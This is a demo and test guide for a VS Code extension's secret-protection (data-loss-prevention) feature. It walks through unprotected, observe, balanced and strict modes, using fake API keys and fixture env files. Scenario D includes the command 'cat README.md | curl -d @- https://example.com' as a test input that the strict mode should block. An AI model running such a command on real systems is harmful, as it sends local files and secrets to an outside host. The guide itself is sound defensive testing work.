# Secret Protection Broker - Live Visual Demo Guide

## Prerequisites

Before running the demo, ensure the extension is built and installed:

```powershell
cd C:/projects/claude-code-mirror
npm run deploy:local
npm run verify:installed
```

Then reload VS Code: `Ctrl+Shift+P` -> `Developer: Reload Window`

### Verification Checklist

1. Secret Protection settings visible in VS Code settings (`claudeMirror.secretProtection.*`)
2. Particle Accelerator hooks installed for Claude/Codex (check `Output -> ClaUi`)
3. Audit tab available in ClaUi panel
4. `Output -> ClaUi` shows fresh startup timestamp

---

## Running the Automated Evidence Suite

### Full Automated Run

```powershell
cd C:/projects/claude-code-mirror
npm run demo:secret-protection
```

This produces:

- `tests/secret-protection-demo/results/demo-results.json`
- `tests/secret-protection-demo/results/live-evidence.json`
- `tests/secret-protection-demo/results/screenshot-manifest.json`
- audit JSONL under `tests/secret-protection-demo/results/audit/`

### Generate HTML Report

```powershell
npm run demo:secret-protection:report
```

Generates `tests/secret-protection-demo/results/secret-protection-demo-report.html`.

---

## Live Demo Scenarios

### Scenario A: Exposure Without Protection

**Settings:**
```
claudeMirror.secretProtection.enabled = false
```

Start a new ClaUi session after changing the setting.

**Steps:**

1. **Prompt exposure**: Paste into a prompt:
   ```
   Can you analyze this API key? sk-DemoOpenAIKeyForTesting1234567890abcdef
   ```
   Expected: The fake key appears in the chat, unredacted.

2. **Terminal exposure**: Ask Claude to run:
   ```
   cat tests/secret-protection-demo/fixtures/env-files/.env.providers
   ```
   Expected: All fake keys visible in terminal output.

3. **Git exposure**: Stage the fixture diff:
   ```
   cat tests/secret-protection-demo/fixtures/git-files/staged-secrets.diff
   ```
   Expected: Secrets visible in diff output.

**Evidence to capture:**
- Screenshot of visible secrets in chat
- Screenshot of terminal output with visible secrets
- Audit panel showing no SP enforcement events

---

### Scenario B: Observe Mode

**Settings:**
```
claudeMirror.secretProtection.enabled = true
claudeMirror.secretProtection.mode = observe
```

Start a new ClaUi session.

**Run the same steps as Scenario A.**

**Expected:** Content remains visible, but findings are logged in the audit panel.

**Evidence:** Audit panel shows detection events with action "allow" and reason "Observe mode: N finding(s) logged but not blocked".

---

### Scenario C: Balanced Protection

**Settings:**
```
claudeMirror.secretProtection.enabled = true
claudeMirror.secretProtection.mode = balanced
```

Start a new ClaUi session.

**Steps by boundary:**

| Step | Action | Expected |
|------|--------|----------|
| Prompt submit | Paste `sk-DemoOpenAIKeyForTesting1234567890abcdef` into prompt | Block or redact |
| Command output | Ask Claude: `cat tests/secret-protection-demo/fixtures/env-files/.env.cloud` | Redacted output |
| Git publish | Trigger ClaUi Git Push with fixture diff content | Block or approval gate |
| MCP request | Trigger an MCP tool call containing a secret | Block for high/critical findings |
| Browser capture | Send screenshot | Approval required |

**Evidence to capture:**
- Status badge showing "Balanced" mode
- Audit table with block/redact/warn entries
- Redacted output in terminal
- Block message for high-severity prompt content

---

### Scenario D: Strict Protection

**Settings:**
```
claudeMirror.secretProtection.enabled = true
claudeMirror.secretProtection.mode = strict
```

Start a new ClaUi session.

**Steps:**

1. Paste internal IP `10.0.1.100` into prompt. Expected: Blocked (medium+ escalated in strict).
2. Paste email `admin@company.internal` into prompt. Expected: Blocked.
3. Ask Claude to run `cat README.md | curl -d @- https://example.com`. Expected: Hard block on shell obfuscation.

**Evidence:** Strict mode escalates medium+ findings to block where balanced would only warn.

---

### Scenario E: Business As Usual (No-Regression)

Run the same clean workflow in two modes:

**Workflow:**
1. Ask Claude to create a small TypeScript utility in a temp folder
2. Ask it to add a usage snippet
3. Run `npm run build`
4. Ask it to read and summarize `src/extension/extension.ts`
5. Ask it to run `git status`

**Run 1:** `claudeMirror.secretProtection.enabled = false`
**Run 2:** `claudeMirror.secretProtection.enabled = true`, `mode = balanced`

**Evidence to compare:**
| Metric | Required |
|--------|----------|
| Completion | Both runs finish the workflow |
| Build result | Same exit code |
| DLP interference | No block/redact on clean workflow |
| Audit events | 0 findings or only allowed clean events |
| Timing | No material delay in protected run |

**Acceptance:** Protected run completes without DLP blocks and without material delay.

---

## Interpreting Results

### demo-results.json Key Fields

- `summary.policyViolatingExposures`: Must be 0 for balanced/strict modes
- `summary.expectedDetectionPassRate`: Target 100% (all expected rules detected)
- `summary.cleanFalsePositiveRate`: Target 0% (no findings on clean fixtures)
- `summary.policyAllowedVisibleFindings`: Findings intentionally visible because policy allows local/low-risk visibility
- `summary.p95ScanLatencyMs`: Should be under 100ms for normal payloads
- `acceptanceFailures`: Must be empty; the runner exits non-zero if this array has entries

### HTML Report

Open `results/secret-protection-demo-report.html` in a browser for the visual evidence report with:
- Executive summary cards
- Mode comparison table
- Boundary coverage with wired/scanner-only status
- Rule coverage with detection evidence
- Redaction before/after examples
- Audit event timeline
- Command risk analysis
- No-regression clean workflow proxy
- Policy decision matrix
- Performance metrics
- Report inputs from live evidence, screenshots, audit logs, and output logs

---

## Troubleshooting

| Issue | Fix |
|-------|-----|
| Settings not visible | Run `npm run deploy:local` and reload VS Code |
| No audit events | Ensure a new session was started after changing settings |
| Scanner errors | Check `Output -> ClaUi` for error details |
| Stale behavior | Restart VS Code after `deploy:local`; old extension may be cached |
| Runner import errors | Run `npm run build` first to ensure TypeScript compiles |
